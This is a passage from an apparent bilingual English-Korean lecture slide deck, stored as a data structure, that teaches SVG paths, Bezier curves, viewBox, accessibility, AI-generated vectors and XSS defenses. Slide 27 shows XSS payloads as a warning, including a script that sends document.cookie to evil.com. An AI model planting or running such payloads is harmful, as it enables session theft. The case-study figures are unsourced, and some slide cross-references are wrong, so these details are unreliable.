                "defKo": "인라인 SVG 임베딩"
            },
            {
                "term": "W3C Vector Specification",
                "def": "The international open standard governing scalable vector graphics markup and browser rendering rules.",
                "defKo": "W3C 벡터 공식 표준 규격"
            }
        ]
    },
    # Slide 14: Pillar Shapes: Paths, Arcs, and Grouping
    {
        "num": 14,
        "type": "content",
        "title": "PILLAR SHAPES: PATHS, ARCS, AND GROUPING",
        "subtitle": "Mastering the fundamental SVG building blocks: `<path>`, `<rect>`, `<circle>`, and `<g>`",
        "points": [
            "Core Primitives: `<rect>`, `<circle>`, `<polygon>`, and `<line>` for simple geometric shapes.",
            "The Master `<path>`: The universal element capable of drawing any 2D curve or icon via `d='...'` coordinates.",
            "The `<g>` Grouping Node: Bundling multiple elements into unified transformable and styleable layers."
        ],
        "script": (
            "[TA Sarah] Slide 14 diagrams \"PILLAR SHAPES: PATHS, ARCS, AND GROUPING.\"\n\n"
            "[TA James] Learn the basic building blocks: `<circle>`, `<rect>`, and `<line>` are great for simple shapes. But the king of SVG is the `<path>` element! Any complex logo, airplane CAD drawing, or human face icon is simply a series of commands inside the `d` attribute!\n\n"
            "[Prof. Peter] And the `<g>` tag groups them together, allowing you to rotate, scale, or animate 50 elements with a single CSS class!\n\n"
            "[TA Sarah] Let us inspect the Calculus of Bezier Curves on Slide 15."
        ),
        "koreanGuide": {
            "summary": "핵심 기본 도형: <path>, <rect>, <circle> 및 <g> 그룹화",
            "points": [
                "기본 프리미티브: 사각형(<rect>), 원(<circle>), 다각형(<polygon>), 선(<line>)",
                "만능 <path> 엘리먼트: d 속성 좌표 명령어로 복잡한 로고, CAD 도면, 아이콘을 자유자재로 묘사",
                "<g> 그룹화 노드: 수십 개 엘리먼트를 레이어로 묶어 단 1줄의 CSS로 회전 및 스케일링 조작"
            ],
            "tips": "제임스 조교와 피터 교수가 만능 <path>와 레이어 그룹화 <g>의 실전 활용법을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "SVG `<g>` Group Element",
                "def": "A container element used to group related graphical objects for collective transformation and CSS styling.",
                "defKo": "SVG `<g>` 그룹 컨테이너"
            },
            {
                "term": "Universal Path Representation",
                "def": "Encoding arbitrary two-dimensional vector contours into a standardized string of coordinate drawing commands.",
                "defKo": "범용 패스 좌표 표현식"
            }
        ]
    },
    # Slide 15: The Calculus of Bezier Curves: Perfect Arcs
    {
        "num": 15,
        "type": "content",
        "title": "THE CALCULUS OF BEZIER CURVES: PERFECT ARCS",
        "subtitle": "Quadratic ($Q$) and Cubic ($C$) Bezier polynomials creating razor-sharp mathematical curves",
        "points": [
            "Quadratic Bezier (`Q cx cy, x y`): Uses 1 control point to pull the curve into smooth parabolic arcs.",
            "Cubic Bezier (`C c1x c1y, c2x c2y, x y`): Uses 2 independent control points for complex S-curves and organic shapes.",
            "Mathematical Precision: The curve is calculated parametrically: $B(t) = (1-t)^2 P_0 + 2(1-t)t P_1 + t^2 P_2$."
        ],
        "script": (
            "[Prof. Peter] Slide 15 uncovers \"THE CALCULUS OF BEZIER CURVES: PERFECT ARCS.\"\n\n"
            "[TA Sarah] How does SVG draw organic human curves? Through Bezier Calculus! A Quadratic curve (`Q`) uses 1 control point to pull a line into a parabola. A Cubic curve (`C`) uses 2 control points, creating elegant S-curves for sports cars and human silhouettes!\n\n"
            "[TA James] The formula on screen: $B(t) = (1-t)^2 P_0 + 2(1-t)t P_1 + t^2 P_2$. The GPU calculates that polynomial at 60 FPS, creating perfectly smooth arcs with zero jagged edges!\n\n"
            "[Prof. Peter] Let us inspect DOM mastery with CSS and JS on Slide 16."
        ),
        "koreanGuide": {
            "summary": "베지에 곡선 미적분: 2차(Q) 및 3차(C) 다항식을 통한 완벽한 곡선 유도",
            "points": [
                "2차 베지에(Q): 1개의 제어점(Control Point)으로 완만한 포물선 곡선 생성",
                "3차 베지에(C): 2개의 독립 제어점으로 자동차 실루엣 및 유기적 S자 곡선 생성",
                "수학적 무결성: B(t) 매개변수 다항식을 GPU가 연산하여 계단 현상 없는 완벽한 매끄러움 유지"
            ],
            "tips": "사라 조교와 피터 교수가 베지에 제어점의 기하학적 당김 원리를 손동작과 함께 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Cubic Bezier Curve (`C`)",
                "def": "A parametric curve defined by four points (start, two control points, end) enabling inflection points and S-curves.",
                "defKo": "3차 베지에 곡선 (Cubic Bezier)"
            },
            {
                "term": "Parametric Curve Equation",
                "def": "A mathematical function expressing geometric coordinates in terms of an independent parameter $t \\in [0, 1]$.",
                "defKo": "매개변수 곡선 방정식"
            }
        ]
    },
    # Slide 16: DOM Mastery: Styling Vector Nodes with CSS & JS
    {
        "num": 16,
        "type": "content",
        "title": "DOM MASTERY: STYLING WITH CSS & JS",
        "subtitle": "Animating stroke offsets, fill transitions, and hover states directly in browser CSS",
        "points": [
            "CSS Transitions: Changing `fill: var(--primary)` on `:hover` with butter-smooth 0.2s ease.",
            "Stroke-Dasharray Animation: Creating mesmerizing 'line-drawing' animations by animating `stroke-dashoffset`.",
            "JavaScript Micro-Interactions: Attaching `addEventListener('click')` directly to individual map regions or chart bars."
        ],
        "script": (
            "[TA Sarah] Slide 16 explores \"DOM MASTERY: STYLING VECTOR NODES WITH CSS & JS.\"\n\n"
            "[TA James] Look at how dynamic SVGs are: You can write CSS rules for individual vector paths: `path:hover { fill: #38bdf8; transform: scale(1.05); }`! You can animate the `stroke-dashoffset` property to make charts draw themselves across the screen in 1 second!\n\n"
            "[Prof. Peter] You can attach click handlers to individual countries on a world map. It turns a static illustration into an interactive software application!\n\n"
            "[TA Sarah] Let us inspect responsive vectors and the viewBox attribute on Slide 17."
        ),
        "koreanGuide": {
            "summary": "DOM 통달: CSS와 자바스크립트를 통한 벡터 노드 실시간 제어",
            "points": [
                "CSS 트랜지션: 마우스 호버 시 fill 색상과 scale을 0.2초 만에 부드럽게 전환",
                "스트로크 애니메이션(stroke-dashoffset): 선이 화면에 스르륵 그려지는 매혹적인 라인 드로잉 효과",
                "자바스크립트 마이크로 인터랙션: 세계 지도의 개별 국가 패스에 직접 클릭 이벤트 바인딩"
            ],
            "tips": "제임스 조교가 stroke-dashoffset을 활용한 선 그리기 애니메이션의 코드를 시연합니다."
        },
        "keyTerms": [
            {
                "term": "Stroke-Dashoffset Animation",
                "def": "A CSS animation technique creating the illusion of progressive path drawing by animating stroke dash offsets.",
                "defKo": "스트로크 대시 애니메이션"
            },
            {
                "term": "Interactive Vector Node",
                "def": "An individual SVG path element bound to DOM mouse events for dynamic user interface feedback.",
                "defKo": "대화형 벡터 노드"
            }
        ]
    },
    # Slide 17: Responsive Vectors: The viewBox Attribute
    {
        "num": 17,
        "type": "content",
        "title": "RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE",
        "subtitle": "The magic coordinate system decoupling internal dimensions from screen rendering width",
        "points": [
            "The `viewBox='minX minY width height'` Invariant: Defines the virtual internal coordinate system (e.g., `0 0 100 100`).",
            "Fluid Scaling: Setting `width: 100%; height: auto;` scales the vector perfectly from a 50px mobile card to a 4K monitor.",
            "`preserveAspectRatio`: Controlling letterboxing, uniform scaling, and sliced aspect ratios."
        ],
        "script": (
            "[Prof. Peter] Slide 17 explains \"RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE.\"\n\n"
            "[TA Sarah] What makes SVG truly responsive? The magical `viewBox` attribute! You define your internal virtual canvas: `viewBox='0 0 800 600'`.\n\n"
            "[TA James] Then in CSS, you set `width: 100%`! The browser automatically scales the virtual coordinate system to fit any screen perfectly—whether it's an iPhone in portrait mode or an ultra-wide curved monitor!\n\n"
            "[Prof. Peter] Let us inspect Digital Inclusion and WCAG Accessibility on Slide 18."
        ),
        "koreanGuide": {
            "summary": "반응형 벡터: viewBox 속성을 통한 가상 좌표계와 화면 스케일링 분리",
            "points": [
                "viewBox='0 0 800 600' 불변식: 내부 가상 캔버스 좌표계를 정의하여 화면 크기와 독립적 설계",
                "유동적 반응형: CSS에서 width: 100%만 주면 모바일 화면부터 4K 모니터까지 완벽 자동 적응",
                "preserveAspectRatio: 화면 왜곡 없이 균일한 가로세로 비율 스케일링 제어"
            ],
            "tips": "사라 조교와 제임스 조교가 viewBox가 어떻게 반응형 웹의 구원투수가 되는지 명쾌히 설명합니다."
        },
        "keyTerms": [
            {
                "term": "SVG `viewBox` Coordinate System",
                "def": "The internal spatial coordinate boundaries mapped to the rendered viewport display dimensions.",
                "defKo": "SVG `viewBox` 가상 좌표계"
            },
            {
                "term": "Fluid Vector Scaling",
                "def": "The seamless expansion or contraction of vector graphics to fill available container width without distortion.",
                "defKo": "유동적 벡터 자동 스케일링"
            }
        ]
    },
    # Slide 18: Digital Inclusion: Screen Readers & WCAG 2.1
    {
        "num": 18,
        "type": "content",
        "title": "DIGITAL INCLUSION: WCAG 2.1 ACCESSIBILITY",
        "subtitle": "Making vector charts and illustrations 100% accessible to visually impaired users and screen readers",
        "points": [
            "Semantic Tags: Using `<title>` and `<desc>` tags inside SVGs to provide rich semantic descriptions.",
            "ARIA Roles: Adding `role='img' aria-labelledby='chartTitle chartDesc'` for assistive screen readers.",
            "Color Contrast Invariant: Enforcing WCAG AAA 7:1 color contrast ratios across all vector palettes."
        ],
        "script": (
            "[Prof. Peter] Slide 18 covers \"DIGITAL INCLUSION: WCAG 2.1 ACCESSIBILITY.\" Technology must love all human beings.\n\n"
            "[TA Sarah] When a blind person visits a website with a bitmap chart, their screen reader says: 'image.png'—useless! But with an accessible SVG, the screen reader reads the `<title>` and `<desc>` tags: 'Q3 Financial Revenue: 45% increase in cloud subscriptions'!\n\n"
            "[TA James] By adding `role='img'` and maintaining 7:1 color contrast, our software becomes accessible to everyone, honoring the dignity of all users!\n\n"
            "[Prof. Peter] Let us examine our second enterprise case study on Slide 22!"
        ),
        "koreanGuide": {
            "summary": "디지털 포용: WCAG 2.1 웹 접근성과 시각 장애인을 위한 스크린 리더 지원",
            "points": [
                "시맨틱 태그: SVG 내부의 <title>과 <desc> 태그를 통해 차트의 핵심 의미를 음성으로 상세 전달",
                "ARIA 역할 바인딩: role='img' 및 aria-labelledby로 보조공학 스크린 리더와 완벽 호환",
                "WCAG AAA 7:1 대비비: 모든 색상 팔레트의 명도 대비를 엄격히 준수하여 저시력자 접근성 보장"
            ],
            "tips": "사라 조교와 피터 교수가 시각 장애인을 위한 시맨틱 접근성의 윤리적 중요성을 강조합니다."
        },
        "keyTerms": [
            {
                "term": "WCAG 2.1 AAA Accessibility",
                "def": "The highest international web accessibility conformance tier ensuring digital assets are perceivable by all users.",
                "defKo": "WCAG 2.1 AAA 웹 접근성 표준"
            },
            {
                "term": "Semantic `<title>` Tag",
                "def": "An accessible SVG element providing a short, plain-text description of a vector graphic for screen readers.",
                "defKo": "시맨틱 벡터 타이틀 태그"
            }
        ]
    },
    # Slide 19: Case Study: 1,000X Asset Compression in SaaS
    {
        "num": 19,
        "type": "content",
        "title": "CASE STUDY: 1,000X ASSET COMPRESSION IN SAAS",
        "subtitle": "Global CRM Enterprise replaces 10,000 PNG assets with clean parametric SVGs, slashing 12GB to 12MB",
        "points": [
            "Before: 10,000 PNG icon variants across 4 themes consumed 12GB on AWS S3 and 8MB on initial page load.",
            "After: Converted to 500 parametric SVG templates with CSS variable theming; total footprint dropped to 12 Megabytes.",
            "Result: 1,000X storage collapse; mobile initial page load dropped from 4.8s to 0.4s; conversion jumped by 28%."
        ],
        "script": (
            "[TA Sarah] Slide 19 details \"CASE STUDY: 1,000X ASSET COMPRESSION IN ENTERPRISE SAAS.\"\n\n"
            "[TA James] A global CRM enterprise had 10,000 PNG icon files across 4 themes (light, dark, high contrast, brand). It consumed 12 gigabytes on S3 and 8 megabytes on every user page load!\n\n"
            "[Prof. Peter] They converted all 10,000 variants into 500 parametric SVG templates with CSS variable theming! Total storage collapsed from 12GB down to 12MB—a 1,000X reduction! Page load dropped from 4.8s to 0.4s, and user checkout conversions surged by 28%!\n\n"
            "[TA Sarah] Let us inspect Part 2 discussion on Slide 20."
        ),
        "koreanGuide": {
            "summary": "엔터프라이즈 SaaS 사례: 10,000개 PNG를 500개 SVG로 전환하여 1,000배 용량 압축",
            "points": [
                "전환 전: 4개 테마별 10,000개 PNG가 12GB 용량을 차지하고 초기 로딩 8MB 유발",
                "전환 후: CSS 변수 기반 500개 매개변수형 SVG 템플릿으로 통합 ➔ 전사 용량 12MB로 1,000배 압축",
                "로딩 시간 4.8초에서 0.4초로 단축, 결제 전환율 28% 상승"
            ],
            "tips": "제임스 조교가 12GB에서 12MB로 줄어든 1,000배 압축의 경이로운 비즈니스 ROI를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "1,000X Asset Compression",
                "def": "The radical reduction in digital asset storage achieved by consolidating redundant raster files into parametric vectors.",
                "defKo": "1,000배 에셋 압축 혁신"
            },
            {
                "term": "Conversion Rate Lift",
                "def": "The measured percentage increase in commercial user actions resulting directly from sub-second web load times.",
                "defKo": "로딩 속도 개선 기반 전환율 상승"
            }
        ]
    },
    # Slide 20: Part 2 Discussion: Redesigning Legacy Pipelines
    {
        "num": 20,
        "type": "content",
        "title": "PART 2 DISCUSSION: REDESIGNING PIPELINES",
        "subtitle": "Connecting XML vector mechanics to Gemini-powered visual generation and LaTeX mathematical systems",
        "points": [
            "From Syntax to Synthesis: How do we generate production-grade SVGs automatically using multimodal AI?",
            "Mathematical Publishing: How do we render publication-grade differential equations using LaTeX?",
            "The Roadmap Ahead: Master AI Vector Synthesis in Part 3, and LaTeX Mathematical Orchestration in Part 4."
        ],
        "script": (
            "[Prof. Peter] Slide 20 bridges our roadmap: \"PART 2 DISCUSSION: REDESIGNING LEGACY PIPELINES.\"\n\n"
            "[TA Sarah] We have mastered the syntax. Now, how do we direct AI models like Gemini to write pristine, error-free SVG code and LaTeX equations on demand?\n\n"
            "[TA James] In Part 3, we explore Gemini as a Multimodal Code Architect, the Canvas interface, pruning redundant XML bloat, and preventing SVG XSS security attacks!\n\n"
            "[Prof. Peter] Let us examine our second enterprise case study on Slide 22!"
        ),
        "koreanGuide": {
            "summary": "Part 2 논의: 레거시 파이프라인 재설계와 AI 벡터 합성으로의 연결",
            "points": [
                "구문에서 합성으로: 멀티모달 AI(Gemini)를 활용해 프로덕션급 SVG와 LaTeX를 자동 생성하는 비결",
                "수학적 조판: 난해한 미분 방정식을 학술 조판 표준 LaTeX로 렌더링하는 파이프라인",
                "Part 3~4 로드맵 제시: AI 벡터 합성 ➔ LaTeX 수학 오케스트레이션 ➔ 실습 13"
            ],
            "tips": "제임스 조교가 멀티모달 AI를 통한 자동 SVG/LaTeX 합성의 미래를 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Multimodal Code Synthesis",
                "def": "The automated authoring of structural code (SVG, HTML, LaTeX) from visual sketches and natural language prompts.",
                "defKo": "멀티모달 코드 자동 합성"
            },
            {
                "term": "Visual Pipeline Modernization",
                "def": "Replacing legacy raster rendering workflows with dynamic code-driven vector and LaTeX toolchains.",
                "defKo": "시각 파이프라인 현대화"
            }
        ]
    },
    # Slide 21: Gemini as a Multimodal Code Architect
    {
        "num": 21,
        "type": "content",
        "title": "GEMINI AS A MULTIMODAL CODE ARCHITECT",
        "subtitle": "Translating whiteboard napkin sketches into valid, semantic, reactive SVG and Canvas code",
        "points": [
            "Visual Ingestion: Upload a photo of a hand-drawn napkin architecture diagram.",
            "AST Code Synthesis: Gemini parses visual geometry and emits clean semantic SVG with correct grouping (`<g>`).",
            "Parameter Tuning: Asking the AI to 'Make the database cylinder cyan and add dashed pulsing arrows'."
        ],
        "script": (
            "[TA Sarah] Slide 21 explores \"GEMINI AS A MULTIMODAL CODE ARCHITECT.\"\n\n"
            "[TA James] Look at the creative workflow: You draw a system architecture diagram on a napkin at a coffee shop. You take a photo with your phone and upload it to Gemini!\n\n"
            "[Prof. Peter] In 4 seconds, Gemini writes 80 lines of clean semantic SVG code—with proper `<rect>`, `<path>`, and `<text>` tags, clean color palettes, and responsive `viewBox` coordinates! No graphic designer needed!\n\n"
            "[TA Sarah] Let us examine our second enterprise case study on Slide 22!"
        ),
        "koreanGuide": {
            "summary": "멀티모달 코드 아키텍트로서의 Gemini: 냅킨 스케치를 완벽한 SVG로 변환",
            "points": [
                "시각 정보 수용: 커피숍 냅킨에 손으로 그린 아키텍처 다이어그램 사진 업로드",
                "AST 코드 자동 합성: 기하학적 도형과 연결선을 인식해 80줄의 시맨틱 SVG 코드로 즉각 변환",
                "매개변수 미세 조정: '데이터베이스 원통을 시안색으로 바꾸고 점선 화살표에 애니메이션 추가해 줘' 즉시 반영"
            ],
            "tips": "사라 조교와 제임스 조교가 냅킨 스케치가 4초 만에 대화형 SVG로 변환되는 놀라운 생산성을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Multimodal Napkin-to-SVG",
                "def": "The computer vision and code generation pipeline converting hand-drawn sketches into clean vector markup.",
                "defKo": "냅킨 스케치-SVG 자동 변환"
            },
            {
                "term": "Semantic Vector Synthesis",
                "def": "Emitting structured vector code with logical layer grouping and semantic element hierarchies.",
                "defKo": "시맨틱 벡터 코드 합성"
            }
        ]
    },
    # Slide 22: Case Study 2: Aerospace Turbine CAD Vector Rendering
    {
        "num": 22,
        "type": "casestudy",
        "title": "CASE STUDY 2: AEROSPACE TURBINE CAD VECTORS",
        "subtitle": "Global Jet Engine Manufacturer renders 50,000-part turbine CAD assembly in 450KB SVG on mobile tablets",
        "company": "Top Global Aerospace Engine Manufacturer",
        "problem": "Field mechanics on flight lines needed to inspect complex 50,000-part jet turbine CAD schematics; heavy 3D CAD software required $8,000 rugged laptops and took 2 minutes to load.",
        "solution": "Built automated Gemini pipeline converting 3D STEP CAD models into layered, interactive, sub-megabyte SVGs with clickable part inspection.",
        "impact": "Engine schematic loaded in 0.2s on standard $300 tablets; field maintenance turnaround accelerated by 45%; saved $24M in delayed flight downtime.",
        "script": (
            "[Prof. Peter] Slide 22 presents \"CASE STUDY 2: AEROSPACE TURBINE CAD VECTOR RENDERING.\"\n\n"
            "[TA Sarah] Airline maintenance mechanics on windy airport runways needed to inspect complex jet engine turbine assemblies containing 50,000 parts. Heavy CAD software required bulky 8,000-dollar rugged laptops that took 2 minutes to load in the cold!\n\n"
            "[TA James] The aerospace company deployed our Gemini pipeline: converting complex 3D CAD files into layered, interactive 450-kilobyte SVG vector schematics! Mechanics opened the complete interactive jet engine on a standard 300-dollar iPad in 0.2 seconds!\n\n"
            "[Prof. Peter] Flight line maintenance turnaround surged by 45%, preventing commercial flight cancellations and saving 24 million dollars annually! That is the power of Calculated Vectors.\n\n"
            "[TA Sarah] Now let us open Part 3 and master AI-Powered Visual Engineering on Slide 23!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 2: 항공기 제트 엔진 50,000개 부품 CAD를 450KB 초경량 SVG로 변환",
            "points": [
                "문제 상황: 활주로 정비사가 50,000개 부품의 3D CAD 도면을 보려면 8,000달러짜리 특수 노트북과 2분의 로딩 시간 필요",
                "솔루션: 제미나이 멀티모달 파이프라인으로 3D CAD를 레이어 분할된 대화형 450KB SVG 벡터로 자동 변환",
                "성과: 300달러 아이패드에서 0.2초 만에 즉시 로딩, 정비 주기 45% 단축, 항공기 결항 방지로 연간 2,400만 달러 절감"
            ],
            "tips": "사라 조교와 제임스 조교가 8,000달러 특수 노트북을 대체한 450KB SVG의 압도적 효율을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "CAD-to-SVG Conversion",
                "def": "The programmatic translation of heavy engineering 3D CAD files into lightweight, interactive 2D vector schematics.",
                "defKo": "CAD-SVG 초경량 벡터 변환"
            },
            {
                "term": "Sub-Second Mobile Field Inspection",
                "def": "Delivering complex technical schematics onto low-cost mobile hardware with instantaneous load times.",
                "defKo": "서브초 모바일 현장 정비 지원"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 23: Part 3 Section Divider
    {
        "num": 23,
        "type": "section",
        "title": "PART 3: GEMINI-POWERED VISUAL ENGINEERING",
        "subtitle": "Canvas co-design, path optimization, XML sanitization, and cybersecurity XSS defenses",
        "script": (
            "[TA Sarah] Look at Slide 23: \"PART 3: GEMINI-POWERED VISUAL ENGINEERING.\" Now we explore human-AI visual co-creation!\n\n"
            "[Prof. Peter] Artificial intelligence is not just a code generator; it is a collaborative design partner. In Part 3, we examine the Canvas interface, parameter controls, XML node sanitation, dynamic light/dark theming, and SVG XSS security defenses.\n\n"
            "[TA James] Let us inspect the Canvas Interface on Slide 24!"
        ),
        "koreanGuide": {
            "summary": "Part 3 섹션 전환: 제미나이 기반 비주얼 엔지니어링과 보안 방어선",
            "points": [
                "인간과 AI의 시각적 협업: 캔버스 인터페이스를 통한 실시간 벡터 공동 디자인",
                "파라미터 직접 제어, XML 노드 경량화, 라이트/다크모드 동적 테마",
                "SVG 내 악성 자바스크립트 삽입을 방어하는 XSS 보안 요새화"
            ],
            "tips": "피터 교수가 협업 디자인 파트너로서의 AI를 선언하고 제임스가 캔버스 제어를 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Canvas Co-Design",
                "def": "An interactive interface allowing simultaneous visual manipulation and code editing between human and AI.",
                "defKo": "캔버스 실시간 공동 디자인 (Canvas Co-Design)"
            },
            {
                "term": "XML Node Sanitation",
                "def": "Pruning unnecessary attributes, redundant decimal precision, and malicious script tags from vector markup.",
                "defKo": "XML 노드 경량화 및 살균"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 24: The Canvas Interface: Human-AI Co-Design
    {
        "num": 24,
        "type": "content",
        "title": "THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN",
        "subtitle": "Side-by-side live rendering: Editing code on the left, observing visual feedback on the right",
        "points": [
            "Split-Screen Co-Creation: Left panel shows editable SVG XML; right panel shows live interactive vector rendering.",
            "Direct Parameter Slider: Adjusting Bezier curve tension, corner radius, and line thickness with zero compilation delay.",
            "Iterative Refinement: Highlighting an element and typing: 'Add a drop shadow and glowing neon border'."
        ],
        "script": (
            "[Prof. Peter] Slide 24 explores \"THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN.\"\n\n"
            "[TA Sarah] In Google AI Studio and Antigravity IDE, look at the Canvas interface: On the left, you see the clean SVG code; on the right, you see the live, rendered graphic!\n\n"
            "[TA James] You can drag interactive control sliders to adjust corner radiuses and line thickness in real time! If you want a neon glow, you highlight the path and prompt: 'Add SVG feDropShadow filter with cyan glow'—it updates in 0.1 seconds!\n\n"
            "[Prof. Peter] Let us inspect XML Node Sanitation on Slide 25."
        ),
        "koreanGuide": {
            "summary": "캔버스 인터페이스: 좌측 코드 편집과 우측 실시간 렌더링의 완벽한 융합",
            "points": [
                "분할 화면 협업: 좌측 패널의 SVG XML 코드 수정과 우측 패널의 실시간 그래픽 렌더링 연동",
                "슬라이더 매개변수 제어: 베지에 곡선 장력, 모서리 반경, 선 두께를 컴파일 지연 없이 즉각 조정",
                "대화형 고도화: 영역을 지정하고 '네온 발광 효과 추가' 프롬프트를 주면 0.1초 만에 feDropShadow 필터 적용"
            ],
            "tips": "사라 조교와 제임스 조교가 캔버스 인터페이스에서 실시간으로 코드가 시각화되는 편리함을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Split-Screen Canvas",
                "def": "A developer layout presenting synchronized source markup alongside real-time hardware-rendered visuals.",
                "defKo": "분할 화면 캔버스 인터페이스"
            },
            {
                "term": "SVG Filter Effects (`<filter>`)",
                "def": "XML elements defining graphical shader effects like Gaussian blur, drop shadows, and lighting maps.",
                "defKo": "SVG 그래픽 셰이더 필터"
            }
        ]
    },
    # Slide 25: XML Node Sanitation: Pruning Redundant Bloat
    {
        "num": 25,
        "type": "content",
        "title": "XML NODE SANITATION: PRUNING BLOAT",
        "subtitle": "Optimizing coordinate precision and stripping editor metadata to achieve maximum performance",
        "points": [
            "Coordinate Precision Pruning: Rounding `12.3456789px` to `12.3px` slashes file size by 40% with zero visual difference.",
            "Metadata Stripping: Removing Adobe Illustrator / Figma namespaces, unneeded XML tags, and empty `<g>` nodes.",
            "Automated SVGO Pipeline: Running automated optimization minifiers to compress vectors into pristine production code."
        ],
        "script": (
            "[TA Sarah] Slide 25 highlights \"XML NODE SANITATION: PRUNING REDUNDANT BLOAT.\"\n\n"
            "[TA James] When you export an SVG from Figma or Illustrator, it contains massive bloat: useless editor metadata, empty groups, and floating-point coordinates with 8 decimal places (`12.83920183px`)!\n\n"
            "[Prof. Peter] Antigravity runs an automated SVGO sanitation pipeline: rounding coordinates to 1 decimal place and stripping unneeded namespaces! File size drops by 60% with zero visible change in optical quality!\n\n"
            "[TA Sarah] Let us inspect Dynamic Theme Adaptability on Slide 26."
        ),
        "koreanGuide": {
            "summary": "XML 노드 살균: 소수점 정밀도 최적화와 메타데이터 제거로 60% 추가 감축",
            "points": [
                "소수점 1자리 라운딩: 12.83920183px 같은 과도한 좌표를 12.8px로 축소하여 용량 40% 절감 (육안 차이 0)",
                "일러스트레이터 찌꺼기 제거: 피그마 및 어도비 편집용 네임스페이스와 빈 그룹(<g>) 태그 전수 정리",
                "자동 SVGO 파이프라인: 빌드 시점에 자동 압축을 적용해 초경량 프로덕션 코드로 정제"
            ],
            "tips": "제임스 조교가 소수점 8자리를 1자리로 줄여 용량을 대폭 깎아내는 엔지니어링 팁을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Coordinate Precision Optimization",
                "def": "Truncating excessive floating-point decimal places in vector path data to minimize file size.",
                "defKo": "좌표 정밀도 소수점 최적화"
            },
            {
                "term": "SVGO Minification",
                "def": "The automated open-source pipeline stripping redundant metadata, comments, and unused groups from SVG code.",
                "defKo": "SVGO 벡터 코드 자동 압축"
            }
        ]
    },
    # Slide 26: Dynamic Theme Adaptability: Light & Dark Modes
    {
        "num": 26,
        "type": "content",
        "title": "DYNAMIC THEME ADAPTABILITY: LIGHT & DARK",
        "subtitle": "Binding vector stroke and fill attributes to CSS variables for instantaneous mode switching",
        "points": [
            "`currentColor` Inheritance: Setting `stroke='currentColor'` allows vectors to automatically inherit parent text color.",
            "CSS Custom Properties: `fill: var(--bg-surface)` and `stroke: var(--brand-accent)` react to dark mode toggles instantly.",
            "Zero Duplicate Assets: Eliminates the need to export separate 'icon-white.png' and 'icon-dark.png' files."
        ],
        "script": (
            "[Prof. Peter] Slide 26 explores \"DYNAMIC THEME ADAPTABILITY: LIGHT & DARK MODES.\"\n\n"
            "[TA Sarah] How do we make an icon adapt to Dark Mode? In the old world, you had to export two separate PNG files: `logo-light.png` and `logo-dark.png`! Double the storage, double the maintenance!\n\n"
            "[TA James] In SVG, you use `currentColor` or CSS variables: `fill='var(--accent-color)'`! When the user clicks the Dark Mode toggle, the entire vector dashboard changes colors in 0 milliseconds flat! Zero duplicate assets!\n\n"
            "[Prof. Peter] Let us inspect Security & Governance: Sanitizing SVGs on Slide 27."
        ),
        "koreanGuide": {
            "summary": "동적 테마 적응성: currentColor 및 CSS 변수를 통한 0ms 다크모드 전환",
            "points": [
                "currentColor 상속: stroke='currentColor' 설정으로 부모 텍스트 색상을 자동으로 상속",
                "CSS 변수 바인딩: fill='var(--brand-accent)'로 다크모드 토글 시 0ms 만에 즉각 색상 전환",
                "중복 에셋 퇴출: light.png와 dark.png를 따로 만들 필요 없이 단 하나의 SVG로 완결"
            ],
            "tips": "사라 조교와 제임스 조교가 1개의 SVG로 라이트/다크 모드를 끝내는 CSS 변수의 우아함을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "`currentColor` Keyword",
                "def": "A CSS value causing an SVG path to dynamically take on the computed text color of its parent container.",
                "defKo": "`currentColor` 색상 상속 키워드"
            },
            {
                "term": "Zero-Duplicate Theme Pipeline",
                "def": "Eliminating duplicate image files by driving asset color palettes through centralized CSS theme tokens.",
                "defKo": "무중복 테마 자산 파이프라인"
            }
        ]
    },
    # Slide 27: Security & Governance: Sanitizing SVGs against XSS
    {
        "num": 27,
        "type": "content",
        "title": "SECURITY: SANITIZING SVGS AGAINST XSS",
        "subtitle": "Neutralizing embedded JavaScript, `<script>` tags, and malicious XML entity expansion attacks",
        "points": [
            "The Vector Vulnerability: Because SVG is XML, malicious hackers can inject `<script>alert(document.cookie)</script>`.",
            "DOMPurify Sanitization: Stripping all executable scripts, `onload` attributes, and external entities before rendering.",
            "Safe Content Security Policy (CSP): Enforcing strict CSP headers blocking inline script execution in user-uploaded SVGs."
        ],
        "script": (
            "[TA Sarah] Slide 27 covers a critical cybersecurity rule: \"SECURITY & GOVERNANCE: SANITIZING SVGS AGAINST XSS.\"\n\n"
            "[TA James] Because SVG is open XML code, an attacker can upload a malicious image containing: `<script>fetch('evil.com', {body: document.cookie})</script>`! If your server serves that raw SVG, your users get hacked!\n\n"
            "[Prof. Peter] We enforce strict DOMPurify sanitization and Content Security Policies (CSP): stripping all `<script>` tags and `onload` handlers before rendering user-uploaded vectors! Security is non-negotiable.\n\n"
            "[TA Sarah] Let us inspect Part 3 Audit Checklist on Slide 28."
        ),
        "koreanGuide": {
            "summary": "보안 및 거버넌스: SVG 내 악성 자바스크립트 XSS 인젝션 방어",
            "points": [
                "벡터 보안 취약점: SVG가 XML 코드이므로 악성 해커가 <script> 태그를 심어 세션 쿠키 탈취 시도 가능",
                "DOMPurify 살균: 실행 가능한 모든 자바스크립트와 onload 속성, 외부 개체(Entity)를 렌더링 전 원천 제거",
                "엄격한 CSP 헤더: 사용자 업로드 SVG에 대해 인라인 스크립트 실행을 차단하는 보안 정책 강제"
            ],
            "tips": "제임스 조교와 피터 교수가 SVG 이미지 파일도 XSS 공격 통로가 될 수 있음을 경고하고 완벽한 살균법을 제시합니다."
        },
        "keyTerms": [
            {
                "term": "SVG Stored XSS",
